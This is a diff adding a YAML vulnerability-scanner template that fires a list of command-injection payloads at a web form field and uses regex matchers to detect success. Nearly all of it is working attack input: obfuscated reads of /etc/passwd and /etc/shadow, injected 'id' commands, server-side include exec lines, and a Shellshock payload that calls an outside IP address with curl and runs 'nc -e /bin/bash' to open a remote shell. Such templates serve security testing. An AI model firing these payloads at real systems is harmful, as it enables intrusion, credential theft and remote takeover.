@@ -1,0 +1,95 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "%22cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd"
+        - ";id|"
+        - ";system('id')"
+        - "%60id%60"
+        - "%26%26cat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "%22%20%60id%60"
+        - "%27cat%20%2Fetc%2Fpasswd"
+        - "|echo${IFS}\"RCE\"${IFS}&&cat${IFS}/etc/passwd"
+        - "a)id"
+        - "||echo${IFS}\"RCE\"${IFS}&&cat${IFS}/etc/passwd"
+        - "<!--#exec cmd=\"id;-->"
+        - "%29%3Bid"
+        - "%26cat%20/etc/passwd"
+        - "& id &"
+        - "|id;"
+        - "|cat$u /etc$u/passwd"
+        - "|id;"
+        - "%27id%27"
+        - "%22i%22d"
+        - "||cat%20/etc/passwd"
+        - ";cat%20/etc/passwd"
+        - "&&cat /etc/passwd"
+        - "%5Cid"
+        - "a);id;"
+        - "cat%20/etc/passwd"
+        - "%27%20id"
+        - "<id"
+        - "a);id|"
+        - "||id"
+        - "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->"
+        - "cat${IFS}/etc/passwd"
+        - "%5Cid"
+        - "%60id%60%26"
+        - "cat+/etc/passwd"
+        - "%22%2Cid%27"
+        - "%7Ccat%24u%2B%2Fetc%24u%2Fpasswd"
+        - ";id|"
+        - "&& id"
+        - "cat$u /etc$u/passwd"
+        - "%27cat%20%2Fetc%2Fpasswd"
+        - "a);id;"
+        - "%27id%27"
+        - "%27id%27"
+        - "%27id%27"
+        - "%60%20id%60"
+        - "%22%20%60id%60"
+        - "%2Aid"
+        - "%27%20id"
+        - "&& id"
+        - "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\\`nc -lvvp 1237 -e /bin/bash\\`\""
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
